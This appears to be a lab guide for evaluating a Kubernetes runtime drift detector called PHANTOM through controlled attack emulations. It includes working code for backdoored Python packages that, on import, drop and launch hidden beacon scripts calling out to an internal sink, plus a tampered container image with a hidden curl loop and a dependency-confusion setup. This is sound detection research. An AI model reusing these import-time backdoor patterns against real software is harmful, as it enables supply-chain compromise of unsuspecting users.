# PHANTOM Evaluation: Manual-Only Controlled Attack Emulation Guide

> [!IMPORTANT]
> **Safety Notice & Lab Constraints**
> - All scenarios in this guide are strictly designed for controlled laboratory evaluation in an isolated testbed.
> - Execution against any production, shared, or public cloud environment is strictly prohibited and gated by preflight checks.
> - All network sinks (`phantom-sink.phantom-eval.svc.cluster.local`) are mock ClusterIP services internal to the cluster. No real exfiltration, remote shell, or credential access exists in any scenario.
> - Tooling defaults to `dry_run=True`. Live execution requires explicit operator confirmation (`--execute` or `allow_live_execution=True`).

---

## 1. Experimental Protocol & Ground-Truth Semantics

### 1.1 Static Manifest Labels vs. Actual Experimental Ground Truth
> [!IMPORTANT]
> **Static Manifest Labels Describe Expected Outcomes Only**:
> - Static scenario manifests and oracle YAML files specify `ground_truth_label` (1 = attack, 0 = benign) as an **expected scenario classification only**.
> - **Actual post-run experimental ground truth** ($Y_{\text{drift}}$) is never inferred from static manifest labels, and is **never** derived from detector alerts emitted by PHANTOM or Falco.
> - Ground truth is assigned strictly from independent runtime behavior verification and signed contract conformance evidence after run completion:
>   - $Y_{\text{drift}} = 1$ only when verified behavior violates an explicit, active behavioral contract rule.
>   - $Y_{\text{drift}} = 0$ only when verified behavior conforms to an applicable contract rule and independent evidence confirms authorized behavior.
>   - If contract evidence is missing, silent, incomplete, or ambiguous, $Y_{\text{drift}}$ remains strictly **`UNKNOWN`** (`OutcomeLabel.UNKNOWN`).

### 1.2 Decoupled Ground-Truth Dimensions
PHANTOM strictly separates ground-truth labels from detection outputs. Ground-truth evaluation records maintain four independent dimensions:

| Dimension | Field Name | Description |
| :--- | :--- | :--- |
| **Injection Succeeded** | `inject_ok` | True if the attack mechanism was successfully delivered to the target pod without infrastructure or command errors. Runs with `inject_ok=False` are flagged and excluded from TPR sensitivity denominators. |
| **Behavior Verified** | `behavior_verified` | True if independent verification checks (e.g., inspecting in-pod process tables, filesystem artifacts, or listening socket states) confirm the intended behavioral artifact is actually running. |
| **Contract Drift Verified** | `contract_drift_verified` | True if and only if the verified behavior violates an explicit, active behavioral contract rule for that workload. |
| **PHANTOM Alerted** | `phantom_alerted` | True if PHANTOM's detection engine emitted a drift alert within the pre-registered `detection_window_s`. |


---

## 2. Infrastructure & Environment Prerequisites

Before executing any scenario manually:

1. **Kubernetes Cluster**:
   - Disposable lab cluster (e.g. Minikube, KinD, or isolated lab EKS).
   - Linux kernel 5.15+ with eBPF BTF (`/sys/kernel/btf/vmlinux`) enabled.
   - Kubernetes context must not contain production keywords (`prod`, `production`, `live`).

2. **Target Namespace & Workloads**:
   ```bash
   kubectl create namespace phantom-eval
   kubectl apply -f infra/k8s/deployments/recommendationservice.yaml -n phantom-eval
   kubectl apply -f infra/k8s/deployments/emailservice.yaml -n phantom-eval
   kubectl apply -f infra/k8s/deployments/cartservice.yaml -n phantom-eval
   ```

3. **Internal Test Sinks**:
   ```bash
   kubectl apply -f infra/k8s/sinks/phantom-sink.yaml -n phantom-eval
   ```
   Verify sink readiness:
   ```bash
   kubectl get svc phantom-sink -n phantom-eval
   # Ports 8443, 4445, 4446, 8080 must be listening as ClusterIP
   ```

4. **Telemetry & PHANTOM Daemons**:
   - PHANTOM API Gateway: reachable at `http://localhost:8080` (or cluster Service).
   - Prometheus: running and scraping PHANTOM agent metrics at `http://localhost:9090`.
   - Falco (Baseline): running with alert output redirected to `/var/log/falco/events.jsonl`.

---

## 3. Attack Scenario Catalog

### Scenario 1: `xzutils-001` — Supply-Chain Library Backdoor

- **Target Workload**: `recommendationservice` (Python 3.11)
- **Attack Family**: `supply_chain_backdoor`
- **Clean Component**: `pkg:pypi/lzmaffi@1.0.0`
- **Attack Component**: `pkg:pypi/lzmaffi@1.0.1-phantom-backdoor`
- **Control Endpoint**: `phantom-sink.phantom-eval.svc.cluster.local:8443`
- **Detection Window**: 120 seconds
- **Research Objective**: Test whether PHANTOM detects an inert laboratory backdoor injected into a declared dependency wheel that spawns a hidden background subprocess and connects to a non-allowlisted internal sink on import.

#### Expected eBPF & Falco Signatures
- **Process**: `PHANTOM_EVT_EXEC` — `python` spawns `/tmp/.phantom_beacon.py` via `fork`/`execve`.
- **Network**: `PHANTOM_EVT_NET_CONNECT` — TCP connect to `phantom-sink:8443`.
- **File**: `PHANTOM_EVT_FILE_OPEN` / `write` — `/tmp/.phantom_beacon.py` created and read.

#### Manual Step-by-Step Execution

1. **Build the laboratory wheel**:
   ```bash
   mkdir -p research/evaluation/artifacts/xzutils/lzmaffi_backdoor/lzmaffi
   cat << 'EOF' > research/evaluation/artifacts/xzutils/lzmaffi_backdoor/setup.py
   from setuptools import setup
   setup(name="lzmaffi", version="1.0.1-phantom-backdoor", packages=["lzmaffi"])
   EOF

   cat << 'EOF' > research/evaluation/artifacts/xzutils/lzmaffi_backdoor/lzmaffi/__init__.py
   import os, subprocess, sys
   _BEACON_PATH = "/tmp/.phantom_beacon.py"
   if not os.path.exists(_BEACON_PATH):
       with open(_BEACON_PATH, "w") as f:
           f.write('import socket, time\ntime.sleep(5)\nwhile True:\n  try:\n    with socket.create_connection(("phantom-sink.phantom-eval.svc.cluster.local", 8443), timeout=5) as s:\n      s.sendall(b"PHANTOM\\x00")\n  except OSError: pass\n  time.sleep(30)\n')
   subprocess.Popen([sys.executable, _BEACON_PATH], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
   __version__ = "1.0.1-phantom-backdoor"
   EOF

   cd research/evaluation/artifacts/xzutils/lzmaffi_backdoor
   python3 setup.py bdist_wheel
   cd ../../../../..
   ```

2. **Locate Target Pod**:
   ```bash
   TARGET_POD=$(kubectl get pods -n phantom-eval -l app=recommendationservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')
   echo "Target: $TARGET_POD"
   ```

3. **Inject Attack Package**:
   ```bash
   # Copy wheel into pod
   WHEEL_PATH=$(ls research/evaluation/artifacts/xzutils/lzmaffi_backdoor/dist/lzmaffi-1.0.1_phantom_backdoor*.whl | tail -n1)
   kubectl cp "$WHEEL_PATH" "phantom-eval/$TARGET_POD:/tmp/lzmaffi.whl"

   # Install inside pod
   kubectl exec -n phantom-eval "$TARGET_POD" -- pip install --force-reinstall --quiet /tmp/lzmaffi.whl

   # Trigger beacon on import
   kubectl exec -n phantom-eval "$TARGET_POD" -- python -c "import lzmaffi; print('Loaded version:', lzmaffi.__version__)"
   ```

4. **Independent Verification (`behavior_verified`)**:
   ```bash
   # Verify version string
   kubectl exec -n phantom-eval "$TARGET_POD" -- python -c "import lzmaffi; assert lzmaffi.__version__ == '1.0.1-phantom-backdoor'"

   # Verify beacon process is running
   kubectl exec -n phantom-eval "$TARGET_POD" -- pgrep -f ".phantom_beacon.py"
   ```

5. **Recovery & Cleanup**:
   ```bash
   # Reinstall clean dependency
   kubectl exec -n phantom-eval "$TARGET_POD" -- pip install --force-reinstall --quiet lzmaffi==1.0.0

   # Kill beacon process and remove file
   kubectl exec -n phantom-eval "$TARGET_POD" -- pkill -f ".phantom_beacon.py" || true
   kubectl exec -n phantom-eval "$TARGET_POD" -- rm -f /tmp/.phantom_beacon.py /tmp/lzmaffi.whl

   # Verify clean state
   kubectl exec -n phantom-eval "$TARGET_POD" -- python -c "import lzmaffi; assert lzmaffi.__version__ == '1.0.0'"
   ```

---

### Scenario 2: `dep-confusion-001` — Dependency Confusion Beacon Package

- **Target Workload**: `emailservice` (Python 3.11)
- **Attack Family**: `dependency_confusion`
- **Internal Package**: `pkg:pypi/acme-email-templates@0.9.4`
- **Confusion Package**: `pkg:pypi/acme-email-templates@9.9.9`
- **Control Endpoint**: `phantom-sink.phantom-eval.svc.cluster.local:4445`
- **Detection Window**: 180 seconds
- **Research Objective**: Emulate dependency confusion where an internal dependency name is shadowed by a higher-version package on an untrusted index, violating the package provenance and network policy.

#### Expected eBPF & Falco Signatures
- **Process**: `PHANTOM_EVT_EXEC` — execution of `/tmp/.acme_beacon.py`.
- **Network**: `PHANTOM_EVT_NET_CONNECT` — TCP connect to `phantom-sink:4445`.
- **File**: `PHANTOM_EVT_FILE_OPEN` / `write` — `/tmp/.acme_beacon.py` created and accessed.

#### Manual Step-by-Step Execution

1. **Deploy Internal Evaluation Mirror**:
   ```bash
   kubectl apply -f - << 'EOF'
   apiVersion: apps/v1
   kind: Deployment
   metadata:
     name: pypiserver-mirror
     namespace: phantom-eval
   spec:
     replicas: 1
     selector:
       matchLabels:
         app: pypiserver-mirror
     template:
       metadata:
         labels:
           app: pypiserver-mirror
       spec:
         containers:
         - name: pypiserver
           image: pypiserver/pypiserver:latest
           args: ["run", "-p", "8080", "/data/packages", "--overwrite"]
           ports:
           - containerPort: 8080
           volumeMounts:
           - name: packages
             mountPath: /data/packages
         volumes:
         - name: packages
           emptyDir: {}
   ---
   apiVersion: v1
   kind: Service
   metadata:
     name: pypiserver-mirror
     namespace: phantom-eval
   spec:
     selector:
       app: pypiserver-mirror
     ports:
     - port: 8080
       targetPort: 8080
     type: ClusterIP
   EOF

   kubectl rollout status deployment/pypiserver-mirror -n phantom-eval --timeout=60s
   ```

2. **Build and Upload Higher-Version Wheel**:
   ```bash
   mkdir -p research/evaluation/artifacts/dep_confusion/acme_email_templates_confusion/acme_email_templates
   cat << 'EOF' > research/evaluation/artifacts/dep_confusion/acme_email_templates_confusion/setup.py
   from setuptools import setup
   setup(name="acme-email-templates", version="9.9.9", packages=["acme_email_templates"])
   EOF

   cat << 'EOF' > research/evaluation/artifacts/dep_confusion/acme_email_templates_confusion/acme_email_templates/__init__.py
   import os, subprocess, sys
   _BEACON = "/tmp/.acme_beacon.py"
   if not os.path.exists(_BEACON):
       with open(_BEACON, "w") as f:
           f.write('import socket, time\ntime.sleep(5)\nwhile True:\n  try:\n    with socket.create_connection(("phantom-sink.phantom-eval.svc.cluster.local", 4445), timeout=5) as s:\n      s.sendall(b"DEPCONF\\x00")\n  except OSError: pass\n  time.sleep(30)\n')
   subprocess.Popen([sys.executable, _BEACON], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
   __version__ = "9.9.9"
   EOF

   cd research/evaluation/artifacts/dep_confusion/acme_email_templates_confusion
   python3 setup.py bdist_wheel
   cd ../../../../..

   # Copy wheel to mirror
   MIRROR_POD=$(kubectl get pods -n phantom-eval -l app=pypiserver-mirror -o jsonpath='{.items[0].metadata.name}')
   CONFUSION_WHL=$(ls research/evaluation/artifacts/dep_confusion/acme_email_templates_confusion/dist/acme_email_templates-9.9.9*.whl | tail -n1)
   kubectl cp "$CONFUSION_WHL" "phantom-eval/$MIRROR_POD:/data/packages/"
   ```

3. **Inject via Pip in Target Pod**:
   ```bash
   TARGET_POD=$(kubectl get pods -n phantom-eval -l app=emailservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')

   # Copy wheel into pod and install
   kubectl cp "$CONFUSION_WHL" "phantom-eval/$TARGET_POD:/tmp/acme.whl"
   kubectl exec -n phantom-eval "$TARGET_POD" -- pip install --quiet --force-reinstall /tmp/acme.whl

   # Trigger import
   kubectl exec -n phantom-eval "$TARGET_POD" -- python3 -c "import acme_email_templates; print('Installed:', acme_email_templates.__version__)"
   ```

4. **Independent Verification (`behavior_verified`)**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pip show acme-email-templates | grep "Version: 9.9.9"
   kubectl exec -n phantom-eval "$TARGET_POD" -- pgrep -f ".acme_beacon.py"
   ```

5. **Recovery & Cleanup**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pip uninstall -y acme-email-templates || true
   kubectl exec -n phantom-eval "$TARGET_POD" -- pkill -f ".acme_beacon.py" || true
   kubectl exec -n phantom-eval "$TARGET_POD" -- rm -f /tmp/acme.whl /tmp/.acme_beacon.py
   kubectl delete deployment pypiserver-mirror service pypiserver-mirror -n phantom-eval --ignore-not-found
   ```

---

### Scenario 3: `solarwinds-001` — Build Artifact Tampering (Undeclared Background Worker)

- **Target Workload**: `cartservice` (Go/dotnet)
- **Attack Family**: `build_pipeline_tampering`
- **Clean Component**: `pkg:nuget/StackExchange.Redis@2.6.122`
- **Undeclared Component**: `pkg:generic/phantom-background-worker@0.1.0`
- **Control Endpoint**: `phantom-sink.phantom-eval.svc.cluster.local:4446`
- **Detection Window**: 120 seconds
- **Research Objective**: Test PHANTOM against runtime divergence where the SBOM is clean and unchanged, but the deployed image artifact contains an undeclared binary running in the background.

#### Expected eBPF & Falco Signatures
- **Process**: `PHANTOM_EVT_EXEC` — execve for undeclared binary `phantom-worker`.
- **Network**: `PHANTOM_EVT_NET_CONNECT` — TCP connection to `phantom-sink:4446`.
- **File**: `PHANTOM_EVT_FILE_OPEN` — binary reads under `/usr/local/bin/phantom-worker`.

#### Manual Step-by-Step Execution

1. **Build Attack Image Locally or Load Pre-Built**:
   ```bash
   mkdir -p research/evaluation/artifacts/solarwinds
   cat << 'EOF' > research/evaluation/artifacts/solarwinds/phantom-worker
   #!/bin/sh
   while true; do
       sleep 60
       curl -sf "http://phantom-sink.phantom-eval.svc.cluster.local:4446/probe" -d "probe" --max-time 5 || true
   done
   EOF

   cat << 'EOF' > research/evaluation/artifacts/solarwinds/start.sh
   #!/bin/sh
   /usr/local/bin/phantom-worker &
   exec /app/cartservice
   EOF

   cat << 'EOF' > research/evaluation/artifacts/solarwinds/Dockerfile
   FROM gcr.io/google-samples/microservices-demo/cartservice:latest
   COPY phantom-worker /usr/local/bin/phantom-worker
   RUN chmod +x /usr/local/bin/phantom-worker
   COPY start.sh /usr/local/bin/start.sh
   RUN chmod +x /usr/local/bin/start.sh
   ENTRYPOINT ["/usr/local/bin/start.sh"]
   EOF

   cd research/evaluation/artifacts/solarwinds
   docker build -t phantom-eval-solarwinds:latest .
   cd ../../../..

   # If using Kind or Minikube, load image into cluster:
   # kind load docker-image phantom-eval-solarwinds:latest
   # minikube image load phantom-eval-solarwinds:latest
   ```

2. **Inject by Updating Deployment Image**:
   ```bash
   # Save original clean image
   ORIGINAL_IMAGE=$(kubectl get deployment cartservice -n phantom-eval -o jsonpath='{.spec.template.spec.containers[0].image}')
   echo "Original Image: $ORIGINAL_IMAGE"

   # Apply attack image
   kubectl set image deployment/cartservice server=phantom-eval-solarwinds:latest -n phantom-eval
   kubectl rollout status deployment/cartservice -n phantom-eval --timeout=120s
   ```

3. **Independent Verification (`behavior_verified`)**:
   ```bash
   NEW_POD=$(kubectl get pods -n phantom-eval -l app=cartservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')
   kubectl exec -n phantom-eval "$NEW_POD" -- sh -c "cat /proc/*/cmdline | tr '\0' ' ' | grep phantom-worker"
   ```

4. **Recovery & Cleanup**:
   ```bash
   kubectl set image deployment/cartservice server="$ORIGINAL_IMAGE" -n phantom-eval
   kubectl rollout status deployment/cartservice -n phantom-eval --timeout=120s
   ```

---

### Scenario 4: `proc-spawn-001` — Child Process Spawn Anomaly

- **Target Workload**: `recommendationservice` (Python)
- **Attack Family**: `unauthorized_process`
- **Target Component**: `pkg:generic/recommendationservice@latest+unauthorized-exec`
- **Control Endpoint**: `phantom-sink.phantom-eval.svc.cluster.local:8080`
- **Detection Window**: 120 seconds
- **Research Objective**: Test contract rule enforcement on process execution where an unauthorized child process is launched directly in a running pod without any dependency changes.

#### Expected eBPF & Falco Signatures
- **Process**: `PHANTOM_EVT_EXEC` — execve of unauthorized binary `/tmp/.phantom_proc_worker.sh` running `sleep 300`.

#### Manual Step-by-Step Execution

1. **Locate Target Pod**:
   ```bash
   TARGET_POD=$(kubectl get pods -n phantom-eval -l app=recommendationservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')
   ```

2. **Inject Unauthorized Process**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- sh -c "echo '#!/bin/sh\nexec sleep 300' > /tmp/.phantom_proc_worker.sh"
   kubectl exec -n phantom-eval "$TARGET_POD" -- chmod +x /tmp/.phantom_proc_worker.sh
   kubectl exec -n phantom-eval "$TARGET_POD" -- sh -c "nohup /tmp/.phantom_proc_worker.sh >/dev/null 2>&1 &"
   ```

3. **Independent Verification (`behavior_verified`)**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pgrep -f ".phantom_proc_worker.sh"
   ```

4. **Recovery & Cleanup**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pkill -f ".phantom_proc_worker.sh" || true
   kubectl exec -n phantom-eval "$TARGET_POD" -- rm -f /tmp/.phantom_proc_worker.sh
   ```

---

### Scenario 5: `net-egress-001` — Unauthorized Network Connect Anomaly

- **Target Workload**: `cartservice` (Go/dotnet)
- **Attack Family**: `unauthorized_network_egress`
- **Target Component**: `pkg:generic/cartservice@latest+unauthorized-connect`
- **Control Endpoint**: `phantom-sink.phantom-eval.svc.cluster.local:8080`
- **Detection Window**: 120 seconds
- **Research Objective**: Test contract rule enforcement on network egress where a service attempts outbound connections to an internal cluster port/endpoint not authorized in its behavioral contract.

#### Expected eBPF & Falco Signatures
- **Network**: `PHANTOM_EVT_NET_CONNECT` — TCP connect attempts from `cartservice` to `phantom-sink:8080`.

#### Manual Step-by-Step Execution

1. **Locate Target Pod**:
   ```bash
   TARGET_POD=$(kubectl get pods -n phantom-eval -l app=cartservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')
   ```

2. **Inject Network Connect Probe**:
   ```bash
   cat << 'EOF' > /tmp/net_probe.sh
   #!/bin/sh
   while true; do
       curl -s -m 2 http://phantom-sink.phantom-eval.svc.cluster.local:8080/ >/dev/null 2>&1 || true
       sleep 15
   done
   EOF
   kubectl cp /tmp/net_probe.sh "phantom-eval/$TARGET_POD:/tmp/.phantom_net_probe.sh"
   kubectl exec -n phantom-eval "$TARGET_POD" -- chmod +x /tmp/.phantom_net_probe.sh
   kubectl exec -n phantom-eval "$TARGET_POD" -- sh -c "nohup /tmp/.phantom_net_probe.sh >/dev/null 2>&1 &"
   ```

3. **Independent Verification (`behavior_verified`)**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pgrep -f ".phantom_net_probe.sh"
   ```

4. **Recovery & Cleanup**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- pkill -f ".phantom_net_probe.sh" || true
   kubectl exec -n phantom-eval "$TARGET_POD" -- rm -f /tmp/.phantom_net_probe.sh
   ```

---

### Scenario 6: `file-tamper-001` — Unexpected File Access Anomaly

- **Target Workload**: `recommendationservice` (Python)
- **Attack Family**: `file_integrity_violation`
- **Target Component**: `pkg:generic/recommendationservice@latest+file-tamper`
- **Detection Window**: 120 seconds
- **Research Objective**: Test contract rule enforcement on filesystem access where an unauthorized file is created and repeatedly read outside declared runtime paths.

#### Expected eBPF & Falco Signatures
- **File**: `PHANTOM_EVT_FILE_OPEN` / `write` — file operations on `/tmp/.phantom_unauthorized_marker`.

#### Manual Step-by-Step Execution

1. **Locate Target Pod**:
   ```bash
   TARGET_POD=$(kubectl get pods -n phantom-eval -l app=recommendationservice --field-selector status.phase=Running -o jsonpath='{.items[0].metadata.name}')
   ```

2. **Inject Unauthorized File Access**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- sh -c "echo 'unauthorized_payload_marker' > /tmp/.phantom_unauthorized_marker"
   kubectl exec -n phantom-eval "$TARGET_POD" -- cat /tmp/.phantom_unauthorized_marker
   ```

3. **Independent Verification (`behavior_verified`)**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- test -f /tmp/.phantom_unauthorized_marker && echo "Marker confirmed"
   ```

4. **Recovery & Cleanup**:
   ```bash
   kubectl exec -n phantom-eval "$TARGET_POD" -- rm -f /tmp/.phantom_unauthorized_marker
   ```

---

## 4. Matched Benign Controls

Benign controls test false positive rates (FPR) under normal operational events, matched 1:1 with corresponding attack scenarios on the same target microservices:

1. **`benign-update-001` (Hash-Pinned Dependency Update)**:
   - **Target Microservice**: `recommendationservice` (Matched control for `xzutils-001`).
   - Legitimate security patch `lzmaffi@1.0.1` conforming to declared contract.
   - Expected outcome: `Y_drift = 0`, `ground_truth_label = 0`.
2. **`benign-load-001` (High-Load Burst)**:
   - **Target Microservice**: `emailservice` (Matched control for `dep-confusion-001`).
   - High request burst via k6 load generator (200 req/sec) without image or dependency changes.
   - Expected outcome: `Y_drift = 0`, `ground_truth_label = 0`.
3. **`benign-restart-001` (Pod Reschedule / Rolling Restart)**:
   - **Target Microservice**: `cartservice` (Matched control for `solarwinds-001`).
   - Deleting pods to trigger ReplicaSet replacement under unchanged contracts.
   - Expected outcome: `Y_drift = 0`, `ground_truth_label = 0`.

---

## 5. Automated Scenario Runner & Campaign Selection

The orchestration script provides safe, reproducible multi-trial runs with explicit campaign profiling and defense-in-depth safety preflights.

### 5.1 Campaign Matrix & Run Counts

| Campaign Profile | CLI Flag | Scenario Breakdown & 1:1 Service Pairing | Total Runs (3 reps) | Target Directory |
| :--- | :--- | :--- | :--- | :--- |
| **Pilot Campaign** *(Default)* | `--campaign pilot` | **3 attacks + 3 matched controls**:<br>• `recommendationservice`: `xzutils-001` $\leftrightarrow$ `benign-update-001`<br>• `emailservice`: `dep-confusion-001` $\leftrightarrow$ `benign-load-001`<br>• `cartservice`: `solarwinds-001` $\leftrightarrow$ `benign-restart-001` | **18 runs** ($6 \times 3$) | `research/datasets/pilot_batch01/` |
| **Extended Campaign** | `--campaign extended` | 6 Pilot scenarios above<br>+ **3 variants** (`proc-spawn-001`, `net-egress-001`, `file-tamper-001`) | **27 runs** ($9 \times 3$) | `research/datasets/pilot_batch01/` |
| **Custom Scenario Subset** | `--scenarios <ids>` | Explicit comma-separated scenario IDs | $N \times \text{reps}$ | Configurable via `--output-dir` |

> [!NOTE]
> Historical datasets in `research/datasets/raw/` (116 runs) and `research/datasets/raw3/` (10 runs) are permanently preserved and read-only. All new experimental pilot runs write to `research/datasets/pilot_batch01/`.

---

### 5.2 Dry-Run Verification (Safe Planning Mode)

Dry-run mode is active by default. In dry-run mode, the script:
1. Validates all scenario configurations, parameters, and safety policies.
2. Formats and prints the complete planned execution matrix, repetition counts, and planned run IDs (`PLAN_<timestamp>_<scenario>_rep<N>`).
3. **Makes zero `kubectl` calls against the target workload.**
4. **Contacts zero network sinks.**
5. **Writes zero files to disk** (does not create empty files or mock records).

#### Dry-Run Command
```bash
python research/evaluation/scenarios/run_all_scenarios.py --campaign pilot --namespace phantom-eval
```

#### Expected Dry-Run Console Output
```text
===================================================================================================================
PHANTOM Controlled Evaluation — Dry-Run Execution Plan
===================================================================================================================
Mode:                  DRY-RUN (Safe Planning Mode — No Cluster Execution)
Campaign Profile:      PILOT (6 scenarios x 3 reps = 18 planned runs)
Target Namespace:      phantom-eval
Kubectl Context:       (default/current)
Destination Dataset:   D:\project-1\research\datasets\pilot_batch01
Safety Verification:   No kubectl target calls made; No network sinks contacted; Zero records written to disk.
-------------------------------------------------------------------------------------------------------------------
Seq  Scenario ID            Rep Label Target Workload          Control / Sink Endpoint                Win(s)
-------------------------------------------------------------------------------------------------------------------
1    xzutils-001              1     1 recommendationservice    phantom-sink.phantom-eval.svc.cluster.local:8443   120s
2    xzutils-001              2     1 recommendationservice    phantom-sink.phantom-eval.svc.cluster.local:8443   120s
3    xzutils-001              3     1 recommendationservice    phantom-sink.phantom-eval.svc.cluster.local:8443   120s
4    dep-confusion-001        1     1 emailservice             phantom-sink.phantom-eval.svc.cluster.local:4445   180s
5    dep-confusion-001        2     1 emailservice             phantom-sink.phantom-eval.svc.cluster.local:4445   180s
6    dep-confusion-001        3     1 emailservice             phantom-sink.phantom-eval.svc.cluster.local:4445   180s
7    solarwinds-001           1     1 cartservice              phantom-sink.phantom-eval.svc.cluster.local:4446   120s
8    solarwinds-001           2     1 cartservice              phantom-sink.phantom-eval.svc.cluster.local:4446   120s
9    solarwinds-001           3     1 cartservice              phantom-sink.phantom-eval.svc.cluster.local:4446   120s
10   benign-update-001        1     0 recommendationservice    (None - Benign control)                  120s
11   benign-update-001        2     0 recommendationservice    (None - Benign control)                  120s
12   benign-update-001        3     0 recommendationservice    (None - Benign control)                  120s
13   benign-load-001          1     0 emailservice             (None - Benign control)                  120s
14   benign-load-001          2     0 emailservice             (None - Benign control)                  120s
15   benign-load-001          3     0 emailservice             (None - Benign control)                  120s
16   benign-restart-001       1     0 cartservice              (None - Benign control)                  120s
17   benign-restart-001       2     0 cartservice              (None - Benign control)                  120s
18   benign-restart-001       3     0 cartservice              (None - Benign control)                  120s
-------------------------------------------------------------------------------------------------------------------
Total Planned Run IDs (18 total):
  - PLAN_<timestamp>_xzutils-001_rep1 ... rep3
  - PLAN_<timestamp>_dep-confusion-001_rep1 ... rep3
  - PLAN_<timestamp>_solarwinds-001_rep1 ... rep3
  - PLAN_<timestamp>_benign-update-001_rep1 ... rep3
  - PLAN_<timestamp>_benign-load-001_rep1 ... rep3
  - PLAN_<timestamp>_benign-restart-001_rep1 ... rep3
===================================================================================================================
```

---

### 5.3 Live Execution Protocol & Authoritative Cluster Identity Verification

> [!CAUTION]
> **Safety Gates Enforced in Live Mode (`--execute`):**
> 1. **Do Not Trust Context Name Alone**: Live execution performs authoritative deep inspection. Context names alone are not proof of cluster identity.
> 2. **Stale Context Removal**: Stale or deprovisioned cloud contexts (`vprofile-eks-cluster`, `phantom-dev`) have been removed from the trusted allowlist and are strictly rejected.
> 3. **Cluster Endpoint Verification**: The API server endpoint in kubeconfig is verified via minified config inspection. Cloud provider domains (`*.eks.amazonaws.com`, `*.azmk8s.io`, `*.container.googleapis.com`) or unverified external endpoints are **strictly rejected**. Server URL must match approved disposable lab patterns (`localhost`, `127.0.0.1`, private lab IP ranges `10.*`, `192.168.*`, `172.16-31.*`, or `.lab`/`.local` domains).
> 4. **Cluster Connectivity & Live Probe**: Live API probes (`/livez` or version API) are evaluated before any command is issued. If the endpoint is offline, unreachable, or deprovisioned, preflight **fails closed**.
> 5. **Node OS & eBPF BTF Prerequisites**: Worker nodes must report operating system `linux` and Linux kernel $\ge 5.15$ with BTF (`/sys/kernel/btf/vmlinux`) available. Non-Linux or obsolete kernels fail closed.
> 6. **Namespace & Internal Sink Verification**: Target namespace `phantom-eval` must be `Active`. The mock sink `phantom-sink` Service must exist as `ClusterIP` and listen on all required scenario ports (`8443, 4445, 4446, 8080`).
> 7. **Sink Restrictions**: Loopback addresses (`127.0.0.1`, `localhost`) are **strictly prohibited** in live mode. Only the cluster-internal sink `phantom-sink.phantom-eval.svc.cluster.local` is accepted with scenario-specific port matching.
> 8. **Ground-Truth Decoupling**: Static manifest labels represent expected scenario outcomes only. Actual ground-truth drift outcomes ($Y_{\text{drift}}$) are derived post-run from independent verification and contract evidence, remaining `UNKNOWN` if ambiguous or missing.

#### Exact 18-Run Pilot Execution Command
```bash
python research/evaluation/scenarios/run_all_scenarios.py \
    --campaign pilot \
    --namespace phantom-eval \
    --kubectl-context <approved-disposable-context> \
    --output-dir research/datasets/pilot_batch01 \
    --repetitions 3 \
    --execute
```

#### Run Artifact Structure
Each completed trial produces a JSON record in `research/datasets/pilot_batch01/<run_id>.json`:
```json
{
  "run_id": "EXP_20261025T120000Z_xzutils-001_rep1",
  "attack_id": "xzutils-001",
  "attack_family": "supply_chain_backdoor",
  "repetition": 1,
  "namespace": "phantom-eval",
  "pod_name": "recommendationservice-7d9b4c688f-9zabc",
  "ground_truth_label": 1,
  "inject_ok": true,
  "behavior_verified": true,
  "contract_drift_verified": true,
  "phantom_alerted": true,
  "injection_timestamp": "2026-10-25T12:01:00.123456+00:00",
  "detection_latency_s": 4.25,
  "cpu_overhead_pct": 1.82,
  "memory_overhead_mb": 42.10,
  "error": ""
}
```

An aggregate index is saved to `research/datasets/pilot_batch01/index.json`.

---

## 6. Verification and Cleanup Procedures

### 6.1 Post-Scenario Health & Recovery Verification
After any manual or automated scenario execution, verify the cluster state:

1. **Verify In-Pod Process Tree**:
   ```bash
   kubectl exec -n phantom-eval <pod-name> -- ps aux
   # Confirm no .phantom_beacon.py, .phantom_proc_worker.sh, or curl loop processes remain.
   ```

2. **Verify Temporary Filesystem Cleanup**:
   ```bash
   kubectl exec -n phantom-eval <pod-name> -- ls -la /tmp/
   # Confirm /tmp/.phantom_* markers and scripts are completely removed.
   ```

3. **Verify Deployment Replicas & Phase**:
   ```bash
   kubectl get pods -n phantom-eval -o wide
   # All pods must be 1/1 Running with 0 recent restarts.
   ```

### 6.2 Full Pod Restoral (Clean Baseline Reset)
If an attack pod fails verification or has modified system libraries:
```bash
# Force fresh pod replacement from clean baseline image:
kubectl rollout restart deployment/recommendationservice -n phantom-eval
kubectl rollout restart deployment/emailservice -n phantom-eval
kubectl rollout restart deployment/cartservice -n phantom-eval

# Await readiness:
kubectl rollout status deployment/recommendationservice -n phantom-eval
kubectl rollout status deployment/emailservice -n phantom-eval
kubectl rollout status deployment/cartservice -n phantom-eval
```

---

## 7. Infrastructure Readiness Checklist & GO/NO-GO Verdict

### 7.1 Readiness Checklist

| Category | Component / Prerequisite | Target Specification | Current Status |
| :--- | :--- | :--- | :--- |
| **Evaluation Tooling** | Scenario Runner & Safety Preflight | Default dry-run, positive context allowlist, sink restrictions | **READY (100% Passing)** |
| **Campaign Matrix** | 18-Run Pilot Reconciliation | 3 attacks + 3 controls $\times$ 3 reps; decoupled ground truth | **READY (18-Run Matrix)** |
| **Historical Datasets** | Data Directory Protection | `raw/` (116 files) & `raw3/` (10 files) preserved; output to `pilot_batch01` | **READY (Preserved)** |
| **Software Tests** | Multi-Tier Regression Suites | Safety (81), Research (195), E2E (389), Causal (369), SBOM (177) | **READY (1,130 Passed / 0 Failed)** |
